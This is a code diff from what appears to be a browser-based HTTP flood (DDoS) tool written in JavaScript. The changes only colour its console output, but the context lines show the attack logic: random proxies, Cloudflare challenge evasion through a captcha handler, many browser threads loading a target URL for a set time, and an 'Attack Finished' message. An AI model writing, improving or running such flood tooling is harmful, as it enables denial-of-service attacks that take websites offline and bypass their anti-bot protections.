@@ -194,7 +194,7 @@ async function protectionHandler(driver, proxy, browser) {
         }
         for (var i = 0; i < 5; i++) { //retry 5 times
             if (title == 'Just a moment...') {
-                console.log(`[${proxy} - ${browser}] - Cloudflare Queue`)
+                console.log(`\x1b[38;5;160m[\x1b[38;5;255m${proxy} - ${browser}\x1b[38;5;160m] - \x1b[38;5;255mCloudflare \x1b[38;5;160mQueue`)
 
                 await sleep(1000);
                 await captchaHandler(driver, browser, proxy)
@@ -229,7 +229,7 @@ async function startBrowser(browser, option, proxy, time) {
             }*/
             //await driver.get('https://witeboard.com/') for tracking mouse behaviour
             var parsed = url.parse(target);
-            console.log(`[${proxy} - ${browser}] - Connected to ${parsed.host}`)
+            console.log(`\x1b[38;5;160m[\x1b[38;5;255m${proxy} - ${browser}\x1b[38;5;160m] - Connected to \x1b[38;5;255m${parsed.host}\x1b[38;5;160m`)
             await driver.get(target.split(" ")[0])
             const actions = driver.actions({bridge: true, async: true});
             const width = await driver.executeScript('return window.innerWidth');
@@ -259,7 +259,7 @@ async function startBrowser(browser, option, proxy, time) {
 
 }
 
-console.log("starting browser flood for " + time + " seconds");
+console.log("\x1b[38;5;160mStarting browser flood for \x1b[38;5;255m" + time + " \x1b[38;5;160mseconds");
 
 for (let i = 0; i < threads; i++) {
     setTimeout(function(){
@@ -267,12 +267,12 @@ for (let i = 0; i < threads; i++) {
         const browser = "firefox" //browsers[Math.floor(Math.random() * browsers.length)]
         var proxy = proxies[Math.floor(Math.random() * proxies.length)];
         options = browserManager(browser, option, proxy)
-        console.log(`[${proxy} - ${browser}] - Browser instance started`);
+        console.log(`\x1b[38;5;160m[\x1b[38;5;255m${proxy} - ${browser}\x1b[38;5;160m] - Browser instance started`);
         startBrowser("firefox", options, proxy, time)
     }, 500)
 }
 
 setTimeout(function() {
-    console.log('Attack Finished')
+    console.log('\x1b[38;5;160mAttack Finished')
 	process.exit()
 }, time * 1000);
